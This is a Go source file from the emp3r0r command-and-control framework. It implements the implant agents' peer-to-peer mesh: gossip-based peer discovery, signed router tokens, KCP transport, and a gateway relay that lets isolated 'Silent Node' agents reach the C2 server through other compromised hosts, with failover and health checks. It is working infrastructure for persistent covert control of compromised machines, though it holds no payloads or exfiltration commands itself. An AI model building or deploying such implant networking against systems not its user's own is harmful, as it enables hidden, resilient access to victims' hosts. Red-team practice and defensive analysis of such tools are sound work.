// Package mesh implements the emp3r0r P2P mesh stack.
//
// Discovery: hashicorp/memberlist gossip (AES-encrypted, def.AESPassword).
// Authorization: C2-signed AgentToken (capability="router") verified ECDSA.
// Transport: KCP (pluggable via MeshTransport interface; see transport.go).
// Relay: bridge.go CONNECT_C2 opcode — Gateway pipes KCP stream to C2 TLS.
// Routing: shortest Distance (hops to C2) preferred.
package mesh

import (
	"context"
	"net"
	"strconv"
	"sync"
	"time"

	"github.com/hashicorp/memberlist"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

var (
	// myDistance is this node's current hop-count to C2.
	//  0  = Gateway (direct C2 access)
	// -1  = Unknown / Silent Node not yet routed
	// n>0 = Routed node (hops through n peers)
	myDistance     = -1
	myDistanceMu   sync.RWMutex
	gossipList     *memberlist.Memberlist
	gossipMu       sync.RWMutex
	gossipDelegate *transport.GossipDelegate

	// gatewayIP is the current best gateway IP for the Silent Node relay.
	// Protected by gatewayMu; updated by watchPeers whenever a better peer appears.
	// Set to "" when the current gateway is confirmed dead.
	gatewayIP  string
	gatewayMu  sync.RWMutex
	routeReady = make(chan struct{}) // closed once on first gateway found
	routeOnce  sync.Once

	// GatewayDeadCh receives a token whenever the active gateway becomes
	// unreachable. agent.go listens on this to drop and rebuild the HTTP client.
	// Buffer=1 so the send is non-blocking; the agent drains it when it reacts.
	GatewayDeadCh = make(chan struct{}, 1)

	// gatewayReadyCh receives a token whenever watchPeers confirms a live gateway.
	// Buffer=1 so producers never block; WaitForRoute drains it.
	gatewayReadyCh = make(chan struct{}, 1)
)

// SetDistance updates this node's advertised distance.
func SetDistance(d int) {
	myDistanceMu.Lock()
	myDistance = d
	myDistanceMu.Unlock()
}

func getDistance() int {
	myDistanceMu.RLock()
	defer myDistanceMu.RUnlock()
	return myDistance
}

// currentMeta returns the current MeshNodeMeta for gossip advertisement.
func currentMeta() *def.MeshNodeMeta {
	return &def.MeshNodeMeta{
		Token:    common.RuntimeConfig.MyAgentToken,
		Distance: getDistance(),
	}
}

// Start launches the full mesh service for this node.
func Start(ctx context.Context) {
	gossipPort := meshGossipPort()
	logging.Infof("Mesh: starting gossip on port %d (direct-c2=%v)", gossipPort, common.RuntimeConfig.IsDirectC2Enabled)

	list, err := transport.StartGossip(ctx, common.RuntimeConfig.InitialPeers, gossipPort, currentMeta)
	if err != nil {
		logging.Errorf("Mesh: gossip failed: %v — operating without peer discovery", err)
	} else {
		gossipMu.Lock()
		gossipList = list
		gossipDelegate = &transport.GossipDelegate{GetMeta: currentMeta}
		gossipMu.Unlock()
		logging.Infof("Mesh: gossip engine ready (%d initial peers)", len(common.RuntimeConfig.InitialPeers))
	}

	if common.RuntimeConfig.IsDirectC2Enabled {
		// Gateway: distance=0, serve relay.
		SetDistance(0)
		go ServeRelay(ctx)
		logging.Infof("Mesh: Gateway relay started on KCP port %s", common.RuntimeConfig.KCPServerPort)
	} else {
		// Silent Node: watch peers for an authorized Gateway.
		go watchPeers(ctx)
	}
}

// WaitForRoute blocks until a Silent Node has a confirmed Gateway IP.
// This is safe to call multiple times; after a gateway failure it will
// block again until watchPeers sets a new live gateway.
func WaitForRoute() string {
	logging.Infof("Mesh: waiting for route to C2...")
	// First call: block until routeReady is closed (first gateway ever found).
	<-routeReady
	// Subsequent calls (e.g. after failover): block on the ready channel.
	for {
		ip := GetGatewayIP()
		if ip != "" {
			logging.Infof("Mesh: route ready (gateway %s)", ip)
			return ip
		}
		// Block until watchPeers signals a new gateway is available.
		<-gatewayReadyCh
	}
}

// GetGatewayIP returns the current best gateway IP (may change if gossip updates).
// Returns "" if no gateway is known yet or the last known gateway is dead.
func GetGatewayIP() string {
	gatewayMu.RLock()
	defer gatewayMu.RUnlock()
	return gatewayIP
}

// UpdateGossipMeta triggers an immediate re-broadcast of this node's NodeMeta
// to the gossip cluster. Call this whenever the local state changes (e.g.
// after an AgentToken is received from C2).
func UpdateGossipMeta() {
	gossipMu.RLock()
	list := gossipList
	gossipMu.RUnlock()
	if list == nil {
		return
	}
	if err := list.UpdateNode(5 * time.Second); err != nil {
		logging.Debugf("Mesh: UpdateNode: %v", err)
	} else {
		logging.Debugf("Mesh: NodeMeta re-broadcast triggered")
	}
}

// signalGatewayDead sends a non-blocking notification that the current gateway is dead.
func signalGatewayDead() {
	select {
	case GatewayDeadCh <- struct{}{}:
	default: // already pending, don't block
	}
}

// ─── Silent Node peer watcher ─────────────────────────────────────────────────

func watchPeers(ctx context.Context) {
	// Default transport: KCP
	var t MeshTransport = KCPTransport{}

	tryPeers := func() bool {
		gossipMu.RLock()
		list := gossipList
		gossipMu.RUnlock()
		if list == nil {
			return false
		}
		peers := transport.GetAuthorizedPeers(list, def.CapabilityRouter)
		logging.Debugf("Mesh: %d authorized peer(s) in gossip view", len(peers))
		for _, ip := range peers {
			// Probe dial: verify the gateway is reachable.
			conn, err := connectViaPeer(ctx, ip, t)
			if err != nil {
				logging.Debugf("Mesh: peer %s failed: %v", ip, err)
				continue
			}
			conn.Close() // probe only — DialGateway is called fresh per C2 request
			SetDistance(1)
			gatewayMu.Lock()
			prev := gatewayIP
			gatewayIP = ip
			gatewayMu.Unlock()
			if prev != ip {
				logging.Infof("Mesh: gateway updated %s → %s", prev, ip)
			}
			// Signal WaitForRoute on first success.
			routeOnce.Do(func() { close(routeReady) })
			// Also wake any WaitForRoute callers waiting for a new gateway after failover.
			select {
			case gatewayReadyCh <- struct{}{}:
			default:
			}
			return true
		}
		return false
	}

	// checkCurrentGateway probes the currently cached gateway.
	// If it fails, clears the IP and signals the agent to re-establish C2.
	checkCurrentGateway := func() {
		ip := GetGatewayIP()
		if ip == "" {
			return // already cleared
		}
		conn, err := connectViaPeer(ctx, ip, t)
		if err != nil {
			logging.Warningf("Mesh: current gateway %s is unreachable (%v), clearing route", ip, err)
			gatewayMu.Lock()
			gatewayIP = ""
			gatewayMu.Unlock()
			SetDistance(-1)
			signalGatewayDead()
		} else {
			conn.Close()
			logging.Debugf("Mesh: current gateway %s is alive", ip)
		}
	}

	// Initial discovery
	for ctx.Err() == nil {
		if tryPeers() {
			break
		}
		logging.Debugf("Mesh: no gateway found yet, retrying in 3s")
		select {
		case <-ctx.Done():
			return
		case <-time.After(3 * time.Second):
		}
	}

	// After first gateway is found, maintain it: health-check every 5s,
	// full re-discover every 10s.
	healthTicker := time.NewTicker(5 * time.Second)
	rediscoverTicker := time.NewTicker(10 * time.Second)
	defer healthTicker.Stop()
	defer rediscoverTicker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-healthTicker.C:
			checkCurrentGateway()
			// If the gateway was just cleared, immediately try peers.
			if GetGatewayIP() == "" {
				if !tryPeers() {
					logging.Warningf("Mesh: no reachable gateway found during re-discovery")
				}
			}
		case <-rediscoverTicker.C:
			// Periodic full re-scan to pick up better/new gateways.
			tryPeers()
		}
	}
}

// connectViaPeer dials a Gateway via KCP, sends CONNECT_C2, and returns the
// established tunnel connection on success.
func connectViaPeer(ctx context.Context, ip string, t MeshTransport) (net.Conn, error) {
	return t.Dial(ctx, ip, common.RuntimeConfig.KCPServerPort)
}

// ─── Helpers ─────────────────────────────────────────────────────────────────

func meshGossipPort() int {
	if p, err := strconv.Atoi(common.RuntimeConfig.MeshGossipPort); err == nil && p > 0 {
		return p
	}
	return 7946 // memberlist default
}
